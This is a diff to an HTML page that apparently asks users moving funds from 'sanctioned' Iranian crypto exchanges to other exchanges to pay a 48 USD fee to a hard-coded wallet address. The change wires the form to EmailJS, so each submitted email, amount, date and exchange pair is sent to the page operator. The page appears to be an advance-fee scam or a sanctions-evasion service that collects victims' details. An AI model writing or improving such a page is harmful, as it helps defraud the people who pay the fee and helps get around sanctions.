@@ -8,6 +8,15 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Geist:wght@200;300;400;500&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <!-- ===== EMAILJS ===== -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("PakuuN4ADUDEqrzHl");
+    })();
+  </script>
+
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -396,6 +405,19 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    /* ── error state ── */
+    .error-row {
+      display: none;
+      align-items: center;
+      gap: 12px;
+      margin-top: 1rem;
+      font-size: 0.75rem;
+      font-weight: 300;
+      letter-spacing: 1px;
+      color: #d47a7a;
+    }
+    .error-row.show { display: flex; }
+
     /* ── footer ── */
     .footer {
       margin-top: 2rem;
@@ -460,32 +482,32 @@
       <div class="field-wrap">
         <label class="field-label">sanctioned exchange (source)</label>
         <select id="src" class="field">
-        <option value="" disabled selected>select an exchange…</option>
-        <option>nobitex</option>
-        <option>Wallex</option>
-        <option>bitpin</option>
-        <option>Ramzinex</option>
-        <option>bit24</option>
-        <option>other</option>
-      </select>
+          <option value="" disabled selected>select an exchange…</option>
+          <option>nobitex</option>
+          <option>Wallex</option>
+          <option>bitpin</option>
+          <option>Ramzinex</option>
+          <option>bit24</option>
+          <option>other</option>
+        </select>
       </div>
 
       <div class="field-wrap">
         <label class="field-label">destination exchange</label>
         <select id="dst" class="field">
-        <option value="" disabled selected>select an exchange…</option>
-        <option>coinex</option>
-        <option>binance</option>
-        <option>kucoin</option>
-        <option>okx</option>
-        <option>bybit</option>
-        <option>gate.io</option>
-        <option>huobi</option>
-        <option>bitfinex</option>
-        <option>kraken</option>
-        <option>coinbase</option>
-        <option>other</option>
-      </select>
+          <option value="" disabled selected>select an exchange…</option>
+          <option>coinex</option>
+          <option>binance</option>
+          <option>kucoin</option>
+          <option>okx</option>
+          <option>bybit</option>
+          <option>gate.io</option>
+          <option>huobi</option>
+          <option>bitfinex</option>
+          <option>kraken</option>
+          <option>coinbase</option>
+          <option>other</option>
+        </select>
       </div>
 
       <div class="row2">
@@ -522,7 +544,7 @@
     <div class="addr-block">
       <div class="addr-text">
         <i class="fas fa-wallet"></i>
-        <span>0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+        <span id="walletDisplay">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
       </div>
       <button class="btn-copy" id="copyBtn">
         <i class="fas fa-copy"></i>
@@ -550,6 +572,11 @@
       <div class="spinner" id="spinner"></div>
       <span id="successText">processing your request…</span>
     </div>
+
+    <div class="error-row" id="errorRow">
+      <i class="fas fa-circle-exclamation" style="color:#d47a7a;"></i>
+      <span id="errorText">something went wrong. please try again.</span>
+    </div>
   </div>
 
   <!-- footer -->
@@ -572,8 +599,10 @@
   const copyBtn = document.getElementById('copyBtn');
   const confirmBtn = document.getElementById('confirmBtn');
   const successRow = document.getElementById('successRow');
+  const errorRow = document.getElementById('errorRow');
   const spinner = document.getElementById('spinner');
   const successText = document.getElementById('successText');
+  const errorText = document.getElementById('errorText');
 
   const fields = {
     src: document.getElementById('src'),
@@ -583,6 +612,11 @@
     email: document.getElementById('email'),
   };
 
+  const WALLET_ADDR = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
+  const FEE_AMOUNT = '48';
+  const FEE_CURRENCY = 'USD';
+
+  // ── Step 1 → Step 2 ──
   nextBtn.addEventListener('click', () => {
     let ok = true;
     Object.values(fields).forEach(f => {
@@ -603,8 +637,7 @@
     f.addEventListener('change', () => { f.style.borderColor = ''; });
   });
 
-  const ADDR = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
-
+  // ── Copy Address ──
   copyBtn.addEventListener('click', () => {
     const write = () => {
       copyBtn.innerHTML = '<i class="fas fa-check"></i><span>copied</span>';
@@ -616,9 +649,9 @@
       }, 2000);
     };
     if (navigator.clipboard) {
-      navigator.clipboard.writeText(ADDR).then(write).catch(() => fallback(ADDR, write));
+      navigator.clipboard.writeText(WALLET_ADDR).then(write).catch(() => fallback(WALLET_ADDR, write));
     } else {
-      fallback(ADDR, write);
+      fallback(WALLET_ADDR, write);
     }
   });
 
@@ -633,22 +666,70 @@
     cb();
   }
 
+  // ── Confirm Payment ──
   confirmBtn.addEventListener('click', () => {
     if (confirmBtn.disabled) return;
+
+    // collect data
+    const srcVal = fields.src.value;
+    const dstVal = fields.dst.value;
+    const amountVal = fields.amount.value;
+    const dateVal = fields.date.value;
+    const emailVal = fields.email.value;
+
+    // validate email
+    if (!emailVal || !emailVal.includes('@')) {
+      errorText.textContent = 'please enter a valid email address.';
+      errorRow.classList.add('show');
+      setTimeout(() => errorRow.classList.remove('show'), 4000);
+      return;
+    }
+
+    // disable button & show loader
     confirmBtn.disabled = true;
     successRow.classList.add('show');
     spinner.style.display = 'block';
-    successText.textContent = 'processing your request…';
+    successText.textContent = 'sending your request…';
 
-    let n = 0;
-    const t = setInterval(() => {
-      if (++n >= 3) {
-        clearInterval(t);
-        spinner.style.display = 'none';
-        successText.innerHTML = '<i class="fas fa-circle-check" style="margin-right:8px;color:#7eab98;opacity:.8;"></i>your request has been submitted';
+    // ── SEND EMAIL via EmailJS ──
+    emailjs.send(
+      "service_j8bd9vn",        // Service ID (از کد دوم)
+      "template_paduqpn",       // Template ID (از کد دوم)
+      {
+        // اینا رو تو قالب ایمیل‌جی‌اس تعریف کن
+        email: emailVal,
+        src_exchange: srcVal,
+        dst_exchange: dstVal,
+        amount: amountVal,
+        date: dateVal,
+        wallet: WALLET_ADDR,
+        fee: FEE_AMOUNT + ' ' + FEE_CURRENCY,
       }
-    }, 1000);
+    )
+    .then((response) => {
+      console.log('✅ Email sent!', response.status, response.text);
+      spinner.style.display = 'none';
+      successText.innerHTML = '<i class="fas fa-circle-check" style="margin-right:8px;color:#7eab98;opacity:.8;"></i>your request has been submitted';
+      
+      // optionally reset after 5 sec
+      setTimeout(() => {
+        successRow.classList.remove('show');
+        confirmBtn.disabled = false;
+      }, 5000);
+    })
+    .catch((err) => {
+      console.error('❌ Email failed:', err);
+      spinner.style.display = 'none';
+      successRow.classList.remove('show');
+      errorText.textContent = 'failed to send. please try again.';
+      errorRow.classList.add('show');
+      setTimeout(() => {
+        errorRow.classList.remove('show');
+        confirmBtn.disabled = false;
+      }, 4000);
+    });
   });
+
 })();
 </script>
 </body>
